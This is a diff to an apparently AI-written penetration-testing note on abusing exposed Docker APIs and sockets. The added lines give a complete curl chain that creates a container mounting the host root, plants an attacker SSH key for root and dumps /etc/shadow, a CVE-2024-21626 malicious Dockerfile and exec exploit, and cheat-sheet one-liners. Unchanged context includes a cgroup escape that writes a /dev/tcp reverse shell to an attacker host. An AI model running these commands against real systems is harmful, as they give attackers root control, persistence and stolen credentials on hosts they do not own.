@@ -1,3 +1,5 @@
+# Docker API
+
 #Docker #DockerAPI #containers #privesc #escape #webservices
 
 ## What is the Docker API?
@@ -7,6 +9,16 @@ Docker exposes a REST API for managing containers, images, volumes, and networks
 - Port: **TCP 2376** — TLS-encrypted (should require client cert)
 - Socket: **`/var/run/docker.sock`** — local Unix socket (writable = root)
 - API docs: versioned at `/v1.xx/`
+
+---
+
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/Cloud/docker\|docker]] | The client itself — `-H tcp://host:2375` drives a remote daemon; run/exec/mount for host takeover |
+| [[Tools/Scanning/NMAP\|nmap]] | Find 2375/2376, version/banner detection |
+| [[Tools/File Transfer/cURL\|cURL]] | Raw REST API (incl. `--unix-socket`) when no docker client is present — the pure-socket escape |
 
 ---
 
@@ -181,16 +193,28 @@ docker run -it -v /:/mnt alpine chroot /mnt
 curl -s --unix-socket /var/run/docker.sock http://localhost/version
 curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
 
-# Deploy escape container via socket
-curl -s --unix-socket /var/run/docker.sock \
-  -X POST http://localhost/containers/create \
+# Deploy escape container via socket — FULL create → start → read chain
+# (needed when you have only the raw socket + curl, no docker client binary)
+SOCK=/var/run/docker.sock
+
+# 1. Create a container that mounts host / and writes an attacker SSH key to root
+cid=$(curl -s --unix-socket $SOCK -X POST http://localhost/containers/create \
   -H "Content-Type: application/json" \
   -d '{
-    "Image": "alpine",
-    "Cmd": ["/bin/sh","-c","chroot /mnt && cat /etc/shadow"],
-    "Binds": ["/:/mnt"],
-    "HostConfig": {"Binds":["/:/mnt"]}
-  }'
+    "Image":"alpine",
+    "Cmd":["/bin/sh","-c","mkdir -p /mnt/root/.ssh && echo ssh-rsa AAAA...attacker >> /mnt/root/.ssh/authorized_keys && cat /mnt/etc/shadow"],
+    "HostConfig":{"Binds":["/:/mnt"]}
+  }' | python3 -c "import sys,json;print(json.load(sys.stdin)['Id'])")
+
+# 2. Start it
+curl -s --unix-socket $SOCK -X POST http://localhost/containers/$cid/start
+
+# 3. Read the command output (host /etc/shadow, proof of root R/W)
+curl -s --unix-socket $SOCK "http://localhost/containers/$cid/logs?stdout=true&stderr=true"
+
+# Same chain works remotely against tcp://<target>:2375 — swap `--unix-socket $SOCK`
+# for the http://<target>:2375 base URL. No local image pull needed if alpine exists;
+# otherwise POST /images/create?fromImage=alpine first.
 ```
 
 ### Privileged Container Escape (Inside Container)
@@ -218,6 +242,27 @@ echo "bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1" >> /cmd
 chmod a+x /cmd
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
+
+### CVE-2024-21626 — Leaky Vessels (runc WORKDIR escape)
+
+runc ≤ 1.1.11 leaks host-filesystem file descriptors: setting a container's working directory to `/proc/self/fd/<n>` (typically fd 7–9) lands the process **in the host namespace** before the fd is closed. Escape without a mounted socket or `--privileged` — you only need to control the image's `WORKDIR` (malicious image via `docker run`/`docker build`) or the `cwd` on a `docker exec`. Patched in runc 1.1.12.
+
+```dockerfile
+# Malicious image variant — WORKDIR points at a leaked host fd
+FROM alpine
+WORKDIR /proc/self/fd/9
+# On run, the container's CWD resolves into the host FS; from there, traverse out:
+RUN cd ../../../ && cat etc/shadow > /proc/1/root/tmp/loot 2>/dev/null || true
+```
+
+```bash
+# Exec variant against an already-running container (no image control needed)
+docker -H tcp://<target>:2375 exec --workdir /proc/self/fd/9 <cid> \
+  sh -c "cd ../../../ && cat etc/shadow"
+# The exact fd number varies (7/8/9) — brute the small range if 9 misses.
+```
+
+See [[Techniques/Container Escape|Container Escape]] for the full breakout catalogue.
 
 ### Container with Host Network / PID Namespace
 
@@ -279,6 +324,8 @@ docker -H tcp://<target>:2375 cp <container_id>:/app/config.py /tmp/
 | Read shadow | `docker -H tcp://host:2375 run --rm -v /:/mnt alpine cat /mnt/etc/shadow` |
 | Exec into container | `docker -H tcp://host:2375 exec -it <id> sh` |
 | docker.sock escape | `docker run -it -v /:/mnt alpine chroot /mnt` |
+| Pure-socket escape (no client) | `curl --unix-socket /var/run/docker.sock -X POST .../containers/create` → `/start` → `/logs` |
+| Leaky Vessels (CVE-2024-21626) | `docker exec --workdir /proc/self/fd/9 <cid> sh -c "cd ../../../ && cat etc/shadow"` |
 | Inspect env vars | `docker -H tcp://host:2375 inspect <id> --format '{{json .Config.Env}}'` |
 | Container logs | `docker -H tcp://host:2375 logs <id>` |
 
@@ -289,5 +336,5 @@ docker -H tcp://<target>:2375 cp <container_id>:/app/config.py /tmp/
 ---
 
 *Created: 2026-07-13*
-*Updated: 2026-08-28*
-*Model: claude-opus-5*
+*Updated: 2026-09-24*
+*Model: claude-opus-4-8*
